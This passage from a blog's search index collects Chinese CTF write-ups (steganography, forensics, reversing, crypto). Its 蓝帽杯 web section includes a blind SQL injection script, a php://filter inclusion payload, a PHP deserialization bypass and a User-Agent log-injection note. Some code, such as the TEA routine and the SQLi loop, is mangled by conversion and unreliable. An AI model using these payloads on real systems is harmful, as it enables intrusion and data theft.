src="https://uploader.shimo.im/f/JrDW02Ex3w59iVej.png!thumbnail" alt="图片"> 找到文件 ## 隐藏文件<br>DBR <img src="https://uploader.shimo.im/f/WWIOMFJTVqniscRO.png!thumbnail" alt="图片"> 其他文件的MFT<br><img src="https://uploader.shimo.im/f/aOI01P7KgduOckiD.png!thumbnail" alt="图片"> data末尾<br><img src="https://uploader.shimo.im/f/bapWRGt6zw8mij6e.png!thumbnail" alt="图片"> 删掉文件 找到文件<br><img src="https://uploader.shimo.im/f/003hRRe1qylbZW1H.png!thumbnail" alt="图片"> 恢复文件<br>多了个recycle.bin目录 ，文件头发生变化 覆盖文件80属性<br><img src="https://uploader.shimo.im/f/7JrWzSGLkF2gC3HV.png!thumbnail" alt="图片"> 后面肯定是不能覆盖的<br>无法恢复文件 <img src="https://uploader.shimo.im/f/D8uDD8zej02zIa9O.png!thumbnail" alt="图片"><br>之前隐藏的文件还在原来的位置上 ## NTFS文件流隐藏 使用命令 ```plain type flag.txt&gt;&gt;fack.txt:flag.txt</p>
+<pre><code class="隐藏文件">找到文件位置 48编号 ![图片](https://uploader.shimo.im/f/OZediVPSXa1Zjbvg.png!thumbnail)
+找到文件流，常驻属性，后面就是文件的内容 找一个大于1kb的文件，隐藏
+![图片](https://uploader.shimo.im/f/TQzr5pHLeCwjaxD5.png!thumbnail)
+这个文件流的80为非常驻属性 0x31 01 E3D804 0x04D8E3 = 317667 在317667簇
+![图片](https://uploader.shimo.im/f/YqRGxVcjZRIYJl8M.png!thumbnail)找到文件
+![图片](https://uploader.shimo.im/f/OCUykj7z1cvNlRDz.png!thumbnail)
+使用取证大师自动恢复，可以恢复出隐藏文件流
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Lun4R-dasctf MISC1 welcome</title>
+    <url>/2020/07/25/cnblog_13378245/</url>
+    <content><![CDATA[<h1 id="这是👉Lun4R-dasctf-MISC1-welcome👈的摘要"><a href="#这是👉Lun4R-dasctf-MISC1-welcome👈的摘要" class="headerlink" title="这是👉Lun4R-dasctf MISC1 welcome👈的摘要"></a><a href="../../../../2020/07/25/cnblog_13378245/">这是👉Lun4R-dasctf MISC1 welcome👈的摘要</a></h1><a id="more"></a>
+<h1 id="MISC-welcome-plain-from-PIL-import-Image-import-binascii-def"><a href="#MISC-welcome-plain-from-PIL-import-Image-import-binascii-def" class="headerlink" title="MISC #### welcome ```plain from PIL import Image import binascii def"></a><strong>MISC</strong> #### welcome ```plain from PIL import Image import binascii def</h1><p>bin2str(string_num): return chr(int(string_num, 2))<br>im=Image.open(“red_blue.png”) W=1024 H=780 pic = Image.new(“RGBA”,(W,H)) i=0<br>s=”” for y in range(0,H): for x in range(0,W): rgba = im.getpixel((x, y))<br>#print((rgba[0])) if(rgba[0]==255): s=s+”1” elif(rgba[0]==0): s=s+”0”<br>file=open(“1”,”w”) file.write(s) h=bin2str(s) file=open(“2.png”,”w”)<br>file.write(h) ``` 通过脚本得到解压密码 hint图片末尾有字符，提示经过编码几次 得到 base85 图片有<br><img src="https://uploader.shimo.im/f/eX66te6ntU3twbeV.png!thumbnail" alt="图片"> jphide得不到密码<br>结束后，经大佬提示，发现有ntfs数据流隐写。<br><img src="https://uploader.shimo.im/f/RI15SalkpqTuX06S.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/U2LR7XiqymL6d7LS.png!thumbnail" alt="图片"> 得到flag</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Lun4R-CyBRICSCTF wp</title>
+    <url>/2020/07/26/cnblog_13381598/</url>
+    <content><![CDATA[<h1 id="这是👉Lun4R-CyBRICSCTF-wp👈的摘要"><a href="#这是👉Lun4R-CyBRICSCTF-wp👈的摘要" class="headerlink" title="这是👉Lun4R-CyBRICSCTF wp👈的摘要"></a><a href="../../../../2020/07/26/cnblog_13381598/">这是👉Lun4R-CyBRICSCTF wp👈的摘要</a></h1><a id="more"></a>
+<p>和小伙伴们一起打了这个xctf|俄罗斯战队的比赛，题目质量真心不错hhh，部分题解小伙伴们还没更新，先发出来，嘻嘻。 # <strong>WEB</strong> ## Hunt<br>(Web, Baby, 50 pts) 打断点，然后就一个一个被抓住了… 接着F12就出现了.（这个flag是白色的，藏在下面。。。。）…<br><img src="https://uploader.shimo.im/f/QG9CJnn0cmas7LGn.png!thumbnail" alt="图片"> # <strong>RE</strong> ##<br>Baby Rev 题目给了个github项目链接 看懂就行 一个简单的疑惑加密 ， key 是33 <code>plain c=[92,0,74,66,116,77,126,69,17,17,102,126, 69,79,97,126,18,76,17,98,16,77,18, 86,90,82,66,72,83,67,88,66] flag=&#39;&#39; for i in range(len(c)): c[i]=c[i]^33 flag+=chr(c[i]) print (flag[::-1]) </code> ## polyglot<br>先根据给的code.c改一下key跑出来一个c++的代码<br>因为递归深度限制在900，所以也要改代码，我菜所以直接手算了，t1是乘，t2是加，然后算出key，跑出来是个py+机器语言的代码： <code>plain import types import dis def define_func(argcount, nlocals, code, consts, names): #PYTHON3.8!!! def inner(): return 0 fn_code = inner.__code__ cd_new = types.CodeType(argcount, 0, fn_code.co_kwonlyargcount, nlocals, 1024, fn_code.co_flags, code, consts, names, tuple([&quot;v%d&quot; for i in range(nlocals)]), fn_code.co_filename, fn_code.co_name, fn_code.co_firstlineno, fn_code.co_lnotab, fn_code.co_freevars, fn_code.co_cellvars) inner.__code__ = cd_new return inner f1 = define_func(2,2,b&#39;|\x00|\x01k\x02S\x00&#39;, (None,), ()) f2 = define_func(1,1,b&#39;t\x00|\x00\x83\x01S\x00&#39;, (None,), (&#39;ord&#39;,)) f3 = define_func(0,0,b&#39;t\x00d\x01\x83\x01S\x00&#39;, (None, &#39;Give me flag: &#39;), (&#39;input&#39;,)) f4 = define_func(1, 3, b&#39;d\x01d\x02d\x03d\x04d\x05d\x01d\x06d\x07d\x08d\td\x03d\nd\x0bd\x0cd\rd\x08d\x0cd\x0ed\x0cd\x0fd\x0ed\x10d\x11d\td\x12d\x03d\x10d\x03d\x0ed\x13d\x0bd\nd\x14d\x08d\x13d\x01d\x01d\nd\td\x01d\x12d\x0bd\x10d\x0fd\x14d\x03d\x0bd\x15d\x16g1&#125;\x01t\x00|\x00\x83\x01t\x00|\x01\x83\x01k\x03r\x82t\x01d\x17\x83\x01\x01\x00d\x18S\x00t\x02|\x00|\x01\x83\x02D\x00]$&#125;\x02t\x03|\x02d\x19\x19\x00t\x04|\x02d\x1a\x19\x00\x83\x01\x83\x02d\x18k\x02r\x8c\x01\x00d\x18S\x00q\x8cd\x1bS\x00&#39;, (None, 99, 121, 98, 114, 105, 115, 123, 52, 97, 100, 51, 101, 55, 57, 53, 54, 48, 49, 50, 56, 102, 125, &#39;Length mismatch!&#39;, False, 1, 0, True), (&#39;len&#39;, &#39;print&#39;, &#39;zip&#39;, &#39;f1&#39;, &#39;f2&#39;)) f5 = define_func(0, 1,b&#39;t\x00\x83\x00&#125;\x00t\x01|\x00\x83\x01d\x01k\x08r\x1ct\x02d\x02\x83\x01\x01\x00n\x08t\x02d\x03\x83\x01\x01\x00d\x00S\x00&#39;,(None, False, &#39;Nope!&#39;, &#39;Yep!&#39;), (&#39;f3&#39;, &#39;f4&#39;, &#39;print&#39;)) dis.dis(f4) </code><br>然后dis得到汇编代码（关键就是给了字符串的那个） 运行结果： <code>plain F:\python\venv\py3.8\Scripts\python.exe D:/download/re2.py 7 0 LOAD_CONST 1 (99) 2 LOAD_CONST 2 (121) 4 LOAD_CONST 3 (98) 6 LOAD_CONST 4 (114) 8 LOAD_CONST 5 (105) 10 LOAD_CONST 1 (99) 12 LOAD_CONST 6 (115) 14 LOAD_CONST 7 (123) 16 LOAD_CONST 8 (52) 18 LOAD_CONST 9 (97) 20 LOAD_CONST 3 (98) 22 LOAD_CONST 10 (100) 24 LOAD_CONST 11 (51) 26 LOAD_CONST 12 (101) 28 LOAD_CONST 13 (55) 30 LOAD_CONST 8 (52) 32 LOAD_CONST 12 (101) 34 LOAD_CONST 14 (57) 36 LOAD_CONST 12 (101) 38 LOAD_CONST 15 (53) 40 LOAD_CONST 14 (57) 42 LOAD_CONST 16 (54) 44 LOAD_CONST 17 (48) 46 LOAD_CONST 9 (97) 48 LOAD_CONST 18 (49) 50 LOAD_CONST 3 (98) 52 LOAD_CONST 16 (54) 54 LOAD_CONST 3 (98) 56 LOAD_CONST 14 (57) 58 LOAD_CONST 19 (50) 60 LOAD_CONST 11 (51) 62 LOAD_CONST 10 (100) 64 LOAD_CONST 20 (56) 66 LOAD_CONST 8 (52) 68 LOAD_CONST 19 (50) 70 LOAD_CONST 1 (99) 72 LOAD_CONST 1 (99) 74 LOAD_CONST 10 (100) 76 LOAD_CONST 9 (97) 78 LOAD_CONST 1 (99) 80 LOAD_CONST 18 (49) 82 LOAD_CONST 11 (51) 84 LOAD_CONST 16 (54) 86 LOAD_CONST 15 (53) 88 LOAD_CONST 20 (56) 90 LOAD_CONST 3 (98) 92 LOAD_CONST 11 (51) 94 LOAD_CONST 21 (102) 96 LOAD_CONST 22 (125) 98 BUILD_LIST 49 100 STORE_FAST 1 (v%d) 102 LOAD_GLOBAL 0 (len) 104 LOAD_FAST 0 (v%d) 106 CALL_FUNCTION 1 108 LOAD_GLOBAL 0 (len) 110 LOAD_FAST 1 (v%d) 112 CALL_FUNCTION 1 114 COMPARE_OP 3 (!=) 116 POP_JUMP_IF_FALSE 130 118 LOAD_GLOBAL 1 (print) 120 LOAD_CONST 23 (&#39;Length mismatch!&#39;) 122 CALL_FUNCTION 1 124 POP_TOP 126 LOAD_CONST 24 (False) 128 RETURN_VALUE &gt;&gt; 130 LOAD_GLOBAL 2 (zip) 132 LOAD_FAST 0 (v%d) 134 LOAD_FAST 1 (v%d) 136 CALL_FUNCTION 2 138 GET_ITER &gt;&gt; 140 FOR_ITER 36 (to 178) 142 STORE_FAST 2 (v%d) 144 LOAD_GLOBAL 3 (f1) 146 LOAD_FAST 2 (v%d) 148 LOAD_CONST 25 (1) 150 BINARY_SUBSCR 152 LOAD_GLOBAL 4 (f2) 154 LOAD_FAST 2 (v%d) 156 LOAD_CONST 26 (0) 158 BINARY_SUBSCR 160 CALL_FUNCTION 1 162 CALL_FUNCTION 2 164 LOAD_CONST 24 (False) 166 COMPARE_OP 2 (==) 168 POP_JUMP_IF_FALSE 140 170 POP_TOP 172 LOAD_CONST 24 (False) 174 RETURN_VALUE 176 JUMP_ABSOLUTE 140 &gt;&gt; 178 LOAD_CONST 27 (True) 180 RETURN_VALUE Process finished with exit code 0 </code> 然后写c跑出flag</p>
+<pre><code class="plain">flag[]=&#123;99,121,98,114,105,99,115,123,52,97,98,100,51,101,55,52,101,57,101,53,57,54,48,97,49,98,54,98,57,50,51,100,56,52,50,99,99,100,97,99,49,51,54,53,56,98,51,102,125&#125;;
+cout &lt;&lt;flag; &#125; ``` # CTB ## DockEsc 直接试出来，正确的没回显 # **CRYPTO** 签到题：
+已经告知是加密了，然后windows下常用 rot13解密
+![图片](https://uploader.shimo.im/f/S7POOuQqeAucD3ge.png!thumbnail) 换个flag头即可 #
+NETWORK ## XCorp 导出smb对象 在流里有用户名 直接登录
+![图片](https://uploader.shimo.im/f/0L46yhI6LolNanBh.png!thumbnail) ## Google
+Cloud I am storing some important stuff in Google&#39;s cloud. Nooo no no, not on
+Google&#39;s disks — in the cloud itself.
+![图片](https://uploader.shimo.im/f/STYUsf0JJD8A09Z9.png!thumbnail) 全是ping。。。
+foremost直接读 实际上从data里拼出完整图片应该也是可行的，大佬直接看出来了。。。 # Forensic ## Keyshooter 视频里
+mahchudqotlzeeb 再用openssl解密就行 ## ## Krevedka wireshark过滤 ```http contains
+&quot;User-Agent: UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697;
+www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile&quot; ``` # rebyC
+## Hellish Reverse
+![图片](https://uploader.shimo.im/f/RVB469GpCafs3tUx.png!thumbnail) 7z就可了。。。
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爆炒腰花-蓝帽杯</title>
+    <url>/2020/08/16/cnblog_13514165/</url>
+    <content><![CDATA[<h1 id="这是👉爆炒腰花-蓝帽杯👈的摘要"><a href="#这是👉爆炒腰花-蓝帽杯👈的摘要" class="headerlink" title="这是👉爆炒腰花-蓝帽杯👈的摘要"></a><a href="../../../../2020/08/16/cnblog_13514165/">这是👉爆炒腰花-蓝帽杯👈的摘要</a></h1><a id="more"></a>
+<p>我们队所有做出的题解都放出来了，本来想先研究python那题再发的。。结果没出来 一家人整整齐齐 &amp; 二进制爷爷，一题进复赛 # 签到<br>gif分解帧，再看不同色域通道。得到flag # sudo 做对九宫格3次，在github上找到了九宫格算法 <code>plain import numpy as np from pwn import * import time def solve(m): if isinstance(m, list): m = np.array(m) elif isinstance(m, str): m = np.loadtxt(m, dtype=np.int, delimiter=&quot;,&quot;) rg = np.arange(m.shape[0]+1) while True: mt = m.copy() while True: d = [] d_len = [] for i in range(m.shape[0]): for j in range(m.shape[1]): if mt[i, j] == 0: possibles = np.setdiff1d(rg, np.union1d(np.union1d(mt[i, :], mt[:, j]), mt[3*(i//3):3*(i//3+1), 3*(j//3):3*(j//3+1)])) d.append([i, j, possibles]) d_len.append(len(possibles)) if len(d) == 0: break idx = np.argmin(d_len) i, j, p = d[idx] if len(p) &gt; 0: num = np.random.choice(p) else: break mt[i, j] = num if len(d) == 0: break if np.all(mt != 0): break print(&quot;\nTrail:\n&quot;, mt) return mt def lllllll(): str1=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() p.recvline() p.recvline() print(str1) dataline = [] data = str1.split(&quot;\n&quot;) # print(data) for a in data: pp = a.split(&quot; &quot;) # print(pp) pp.remove(&#39;&#39;) #print(pp) if (pp != []): for i in range(0, 9): if (pp[i] == &#39;#&#39;): #print(pp[i]) pp[i] = &#39;0&#39; pp[i] = int(pp[i]) # print(pp) dataline.append(pp) print(dataline) result=solve(dataline) s=&#39;&#39; #solve = solve.tostring() for i in range(0,9): for j in range(0,9): s+=str(int(result[i][j])) #print(solve[i][j]), print(s) p.sendline(s) str1=&#39;&#39; time.sleep(3) if __name__ == &quot;__main__&quot;: p=remote(&quot;47.93.204.245&quot;,&quot;12000&quot;) i=0 while(i&lt;3): lllllll() i+=1 p.interactive() </code> # 熟悉的解密 base64隐写和tea算法 <code>plain import re path = &#39;./1.txt&#39; b64char = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39; with open(path, &#39;r&#39;)as f: cipher = [i.strip() for i in f.readlines()] plaintext = &#39;&#39; for i in cipher: if i[-2] == &#39;=&#39;: # There are 4-bit hidden info while end with two &#39;=&#39; bin_message = bin(b64char.index(i[-3]))[2:].zfill(4) plaintext += bin_message[-4:] elif i[-1] == &#39;=&#39;: # There are 2-bit hidden info while end with one &#39;=&#39; bin_message = bin(b64char.index(i[-2]))[2:].zfill(2) plaintext += bin_message[-2:] plaintext = re.findall(&#39;.&#123;8&#125;&#39;, plaintext) # 8bits/group plaintext = &#39;&#39;.join([chr(int(i,2)) for i in plaintext]) print plaintext </code> ```plain #include  #include  //加密函数 void encrypt(uint32_t* v,<br>uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up <em>/<br>uint32_t delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0],<br>k1 = k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /</em><br>basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1</p>
+<blockquote>
+<blockquote>
+<ol start="5">
+<li><ul>
+<li>k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); } /* end<br>cycle <em>/ v[0] = v0; v[1] = v1; } //解密函数 void decrypt(uint32_t</em> v, uint32_t* k)<br>{ uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up <em>/ uint32_t<br>delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0], k1 =<br>k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /*<br>basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);<br>v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } /</em> end<br>cycle */ v[0] = v0; v[1] = v1; } int main() { //#cipher = [[4018289233L,<br>2950320151L], //[1771827478L, 493980876L], [1863284879L, 1137797599L],<br>//[2759701525L, 3957885055L], [2600866805L, 78850724L]] uint32_t v[2] = {<br>4018289233,2950320151}, //这里要两对两对的做 k[4] = { 11,22,33,44 }; decrypt(v, k); //<br>v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(“解密后的数据：%x%x\n”,<br>v[0], v[1]); return 0; } <code># WEB部分 ## easiestSQLI 测试一下发现是数字型的，过滤了空格，用括号替换一下，然后逐个测试字符即可</code>plain import requests import string<br>import re r = requests.session() url =<br>‘<a href="http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),%7B0%7D,1)=char(%7B1%7D))&#39;">http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),{0},1)=char({1}))&#39;</a><br>strings = string.printable for i in range(42): k = i + 1 for c in strings: res<br>= r.get(url.format(k,ord(j))) if re.findall(r’YES~’,res.content.decode()):<br>print(c,end=’’) break ``` ## 文件包含绕过<br>利用伪协议，发现一般的过滤器没有办法，然后找了一下php://filter的其他操作，发现可以用这个协议来获取字符，得到的结果每两个逆序一下即可<br>payload：<br>?filename=php://filter/convert.iconv.faUCS-2LE.UCS-2BE/resource=flag.php ##<br>Soitgoes 文件包含拿一下源码 类文件在try.php里面，传参点在index，发现类中的属性有随机生成的并进行比较，利用引用赋值绕过。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+</blockquote>
+<pre><code class="plain">$this-&gt;alize-&gt;getFlag(); &#125; &#125; class Flag&#123; public $f; public $t1; public $t2;
+function __construct($file)&#123; echo &quot;Another construction!!&quot;; $this-&gt;f = $file;
+$this-&gt;t1 = $this-&gt;t2 = md5(rand(1,10000)); &#125; public function getFlag()&#123;
+$this-&gt;t2 = md5(rand(1,10000)); echo $this-&gt;t1; echo $this-&gt;t2; if($this-&gt;t1
+=== $this-&gt;t2) &#123; if(isset($this-&gt;f))&#123; echo @highlight_file($this-&gt;f,true); &#125; &#125;
+&#125; &#125; $b=new Flag(&#39;flag.php&#39;); $b-&gt;t1=&amp;$b-&gt;t2; $a=new Seri($b);
+echo(serialize($a)); ?&gt; ```
+![图片](https://uploader.shimo.im/f/sXG0FyVO2rzOMR2P.png!thumbnail) ## inclusion
+考点是参数注入，下面是接替思路 根据提示.index.php.swp获取源码，审计一下 发现X-Forwarded-For头可以作为文件夹名称，这参数点可控
+关键代码 ```plain file_put_contents(&#39;res&#39;,print_r($_SERVER,true)); ```
+发现可以利用日志执行/get_flag,本地调试发现可以返回一系列信息，选择User-agent进行注入
+![图片](https://uploader.shimo.im/f/5p7kA3Giyn9ReCnC.png!thumbnail) # 逆向
+RE是些什么神仙题啊 js那个好像是KCTF的原题 已经恢复OPCODE了但是时间不够了，还有一个是迷宫问题？ 就做了个APK而且困难重重，我直接裂开
+夜神模拟器跑一下 ![图片](https://uploader.shimo.im/f/d9e7AcH8AqlzdefP.png!thumbnail)
+首先先查一下看是不是有壳加固
+![图片](https://uploader.shimo.im/f/gvJA5bmUo6vKVitd.png!thumbnail) 好像没有 用 jadx
+分析一波 ![图片](https://uploader.shimo.im/f/yP9ySOjuHXDaZnTN.png!thumbnail)
+![图片](https://uploader.shimo.im/f/MJzW0iln4fAEFz7A.png!thumbnail) 大致看了一下abc
+三个函数无非是HEx转化啥的 system.out.println打印出的结果也是加密的
+9SKj8BfvJD5PcdH+Rh7TIbXwgpC/Nntiq62rWUEaAzQ3ZyVFG4mLoY0l1xOeMkus 这时就卡住了
+然后看了一会PWN 发现不会又回来了 之前做网鼎杯还是啥我记得有一个加密函数在NATIVE层的 用JEB导出libnative.so然后用IDA分析
+![图片](https://uploader.shimo.im/f/Rc0GmWmRMMTIyNts.png!thumbnail) 细心搜索发现关键函数
+![图片](https://uploader.shimo.im/f/UoZyLShNtXsXT6Ry.png!thumbnail)
+![图片](https://uploader.shimo.im/f/VR7NIkr0DAkt1Hga.png!thumbnail) 看了一下a 函数
+好像是生成二叉树，我数据结构都快忘了，又花了一些时间复习。。或许这就是菜鸡吧 之后进行中序遍历和后序遍历，比对两个字符串，如果正确，先序遍历应该就是flag
+已知中序遍历结果和后续遍历 参考
+[https://blog.csdn.net/BigData_Mining/article/details/81076069](https://blog.csdn.net/BigData_Mining/article/details/81076069)
+00235CFPaeefijlmnrwz 020C5PaeeFlmnjzwrif3 算出前续遍历 3020fF5CeaPeirjnmlwz 我太菜了
+这题花了太多时间 quickjs 那题已经参考KCTF那题还原opcode了 没时间了 QAQ # ZUC
+安装gmssl一把梭，就出一个简单cry是看不起cry吗？
+![图片](https://uploader.shimo.im/f/nfprRv9ZwbMs2oG6.png!thumbnail)
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HWS选拔赛-MISC</title>
+    <url>/2020/08/16/cnblog_13514707/</url>
+    <content><![CDATA[<h1 id="这是👉HWS选拔赛-MISC👈的摘要"><a href="#这是👉HWS选拔赛-MISC👈的摘要" class="headerlink" title="这是👉HWS选拔赛-MISC👈的摘要"></a><a href="../../../../2020/08/16/cnblog_13514707/">这是👉HWS选拔赛-MISC👈的摘要</a></h1><a id="more"></a>
+<p><del>为啥今天这么高产，因为和队友一起搭的mc服务器上不去了，想一起玩的找我呀</del> 因为开学的原因去不了HWS了，看看题。想去QAQ  # 近源黑客<br><img src="https://uploader.shimo.im/f/wguAfZetPXLTux9v.png!thumbnail" alt="图片"><br>在压缩包里注释有提示，密码应该是DASCTF+4位数字 然后pcapng包里发现是wifi连接的包，那么可能是破解wifi密码<br>刚开始用的是aircrack，出不来。 放出提示后，找到了文章<br><a href="https://www.anquanke.com/post/id/154286">https://www.anquanke.com/post/id/154286</a><br>按照这个操作，最后密码本换成DASCTF+4位数字就可以了 # fakepdf<br>由于直接右键用010之类的打开会直接打开cmd.exe,右键查看属性又不能把命令都显示全，所以先把lnk文件内容cat出来，可以看到命令（把00去掉）。<br><img src="https://uploader.shimo.im/f/jwJoiDWSAXDHEKor.png!thumbnail" alt="图片"><br>执行命令会在temp文件夹下生成一个js文件，<br><img src="https://uploader.shimo.im/f/LRNL1v1pG6whyJZh.png!thumbnail" alt="图片"><br>接着执行命令。之后就生成了pdf 找到decode的这个文件<br><img src="https://uploader.shimo.im/f/l5A0piWQFVcbQkxz.png!thumbnail" alt="图片"><br>对文件内容进行base64，再用winrar解压（其实就是decode）得到文件<br><img src="https://uploader.shimo.im/f/RMsyhDEFlkOIZP1m.png!thumbnail" alt="图片"><br>最后同名的这个文件就是flag<br><img src="https://uploader.shimo.im/f/EyQJIafC0uLJuxKm.png!thumbnail" alt="图片"><br>不会vb，用python解一下<br><img src="https://uploader.shimo.im/f/7d5pNxJOgJGBFOj3.png!thumbnail" alt="图片"> 得到flag</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>湖湘杯-MISC-WP</title>
+    <url>/2020/11/02/cnblog_13913331/</url>
+    <content><![CDATA[<h1 id="这是👉湖湘杯-MISC-WP👈的摘要"><a href="#这是👉湖湘杯-MISC-WP👈的摘要" class="headerlink" title="这是👉湖湘杯-MISC-WP👈的摘要"></a><a href="../../../../2020/11/02/cnblog_13913331/">这是👉湖湘杯-MISC-WP👈的摘要</a></h1><a id="more"></a>
+<p>中午ak了MISC，下午只能眼睁睁看自己掉名次 ### 颜文字之谜 导出HTTP，发现一个index-demo文件，在其中发现一串雪花和一串base64<br>base64隐写解下密，得到lorrie 用这个秘钥解snow<br>得到<img src="https://uploader.shimo.im/f/ZvRtKHgHF3jFN50L.png!thumbnail" alt="图片"> 替换成moser解密<br>得到flag <img src="https://uploader.shimo.im/f/CbMxvY9LdwDkz6WK.png!thumbnail" alt="图片"> ###<br>passwd<br>volatility提取密码，<img src="https://uploader.shimo.im/f/33aqWIpGmBvKvpeV.png!thumbnail" alt="图片"><br>cmd5 解密 即可 <img src="https://uploader.shimo.im/f/Jepfou4Rxlb2yBNN.png!thumbnail" alt="图片"></p>
+<h3 id="虚实之间-明文攻击压缩包，文本五个一组得到flag-ffd5e341-le25b2dc-ab15cbb-gc3bc5b-789b51"><a href="#虚实之间-明文攻击压缩包，文本五个一组得到flag-ffd5e341-le25b2dc-ab15cbb-gc3bc5b-789b51" class="headerlink" title="虚实之间 明文攻击压缩包，文本五个一组得到flag ffd5e341 le25b2dc ab15cbb} gc3bc5b {789b51"></a>虚实之间 明文攻击压缩包，文本五个一组得到flag ffd5e341 le25b2dc ab15cbb} gc3bc5b {789b51</h3><p>febc7d2138555b9ebccb32b554dbb11c ### 隐藏的秘密 先在桌面文件中发现一个txt文件<br><img src="https://uploader.shimo.im/f/elPpnWqsMpm2E6af.png!thumbnail" alt="图片"><br>然后注册表中发现一个登录过的用户<br><img src="https://uploader.shimo.im/f/uSRsHitnUb6hYv94.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/4En4d62DDDS4Ag66.png!thumbnail" alt="图片"> 提取密码 cmd5解密<br><img src="https://uploader.shimo.im/f/7v4706yMV55D3QSv.png!thumbnail" alt="图片"></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>博客园</tag>
+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何评价2020智警杯</title>
+    <url>/2020/07/24/cnblog_13374821/</url>
+    <content><![CDATA[<h1 id="这是👉如何评价2020智警杯👈的摘要"><a href="#这是👉如何评价2020智警杯👈的摘要" class="headerlink" title="这是👉如何评价2020智警杯👈的摘要"></a><a href="../../../../2020/07/24/cnblog_13374821/">这是👉如何评价2020智警杯👈的摘要</a></h1><a id="more"></a>
+<p>我们的申诉基本是失败了，但是我不能让这件事就这么被掩盖，我会将整件事阐述一遍，大家自行评判。文中涉及人员已做打码操作。 简述：<br>在比赛开始后15分钟左右，我们重置了master服务器。但是重置一直没有成功，我们也积极的联系负责人进行处理，但是直到比赛结束，我们依旧无法连接到master服务器（推测是服务器未开机或ip问题）。事后主办方作出了答复，将此问题归咎于个人和云服务器，并没有道歉和解决。<br>详细过程： 服务器重置不成功，不启动，持续大约15分钟。<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730193947913-1508357277.png"><br>后进入异常状态，寻找工作人员恢复。<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730194010021-614172214.png"><br>这是负责人张<em>华在群里的通知<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730191326876-1120154321.png"><br>可以看到这是比赛开始后1个小时才作出的通知 这是负责人张</em>华做出的回复<br><img src="https://uploader.shimo.im/f/qEO1fHt1SjZ68cX3.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/YevbYX5SAXTGHYlP.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/RnqENTRTKQA6N7sx.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/IvKvwYrKPTb09I1Y.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/dcW5IsxboSmeNDUM.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/eEzPaqaMPPVwUlgL.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/vNUvnIhVkDO2JZ3X.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/VxWbc6FYlDn0HNO5.JPG!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/idT2PjHF61pvd8LQ.JPG!thumbnail" alt="图片"><br>这是负责人张<em>晶在赛后作出的回复<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730191538459-1795691939.png"><br>将问题归于个人操作 这是负责人张</em>华赛后做出的回复<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730191722933-1331559345.png"><br>这是浙警大数据实验室作出的回复<br><img src="https://img2020.cnblogs.com/blog/1619455/202007/1619455-20200730191821198-853524852.png"><br>将问题归于云平台，服务器太多了，重启不过来 -– 以下为个人观点，大家看个乐呵<br>对于这件事，主办方没有承担相应的责任，作出的解释将责任归咎于个人操作和云服务器。<br>我认为这完全是主办方都不负责，但凡红亚在比赛之前测试过，都不至于出现这种情况。 ``` 